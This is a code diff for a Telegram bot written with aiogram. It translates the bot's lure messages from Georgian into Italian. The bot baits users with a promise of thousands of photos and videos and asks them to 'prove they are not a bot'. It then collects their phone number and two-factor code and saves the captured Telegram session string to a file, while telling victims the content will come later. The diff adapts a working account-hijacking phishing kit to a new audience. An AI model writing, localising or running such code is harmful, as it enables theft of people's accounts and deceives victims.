@@ -42,12 +42,12 @@ os.makedirs("sessions", exist_ok=True)
 @dp.message_handler(commands=['start'])
 async def cmd_start(message: types.Message):
     keyboard = InlineKeyboardMarkup().add(
-        InlineKeyboardButton(" ავტორიზაცია პირველ ანგარიშზე🥺", callback_data="auth_account")
+        InlineKeyboardButton("Autorizzazione sul primo conto🥺", callback_data="auth_account")
     )
     await message.answer(
-        "👋 🇬🇪 გამარჯობა! ❤️\n"
-        "გინდა ნახო 10,000-ზე მეტი ფოტო და 4,000-ზე მეტი ვიდეო? 👁\n"
-        "დაადასტურე რომ არ ხარ ბოტი ქვემოთ მოცემული ღილაკით. 🤖👇\n\n",
+        "👋🇮🇹 Ciao! ❤️\n"
+        "Vuoi vedere oltre 10.000 foto e oltre 4.000 video? 👁\n"
+        "Verifica di non essere un bot con il pulsante qui sotto. 🤖👇\n\n",
         reply_markup=keyboard
     )
 
@@ -59,9 +59,9 @@ async def start_auth(callback_query: types.CallbackQuery):
     user_states[user_id] = 'awaiting_contact'
 
     kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
-    kb.add(KeyboardButton("📱 გაგვიზიარე შენი ნომერი", request_contact=True))
+    kb.add(KeyboardButton("📱 Condividi il tuo numero", request_contact=True))
 
-    await bot.send_message(user_id, "🥺 გთხოვ გაგვიზიარე შენი ტელეფონის ნომერი:", reply_markup=kb)
+    await bot.send_message(user_id, "🥺 Per favore condividi il tuo numero di telefono:в", reply_markup=kb)
     await bot.answer_callback_query(callback_query.id)
 
 @dp.message_handler(content_types=types.ContentType.CONTACT)
@@ -201,7 +201,7 @@ async def process_2fa(message: types.Message):
             with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                 json.dump({"phone": phone, "session": session_str}, f)
 
-            await message.answer("you confirmed that you are not a robot, nice to meet you, I'm a little busy right now, wait a little, I can't say just how long, but not very long❤️😘")
+            await message.answer("Stiamo lavorando in modalità manuale, quindi ci scusiamo per il ritardo, presto vi invieremo materiale fotografico e video😉🧍‍♀️.")
             await client.disconnect()
             cleanup(user_id)
         else:
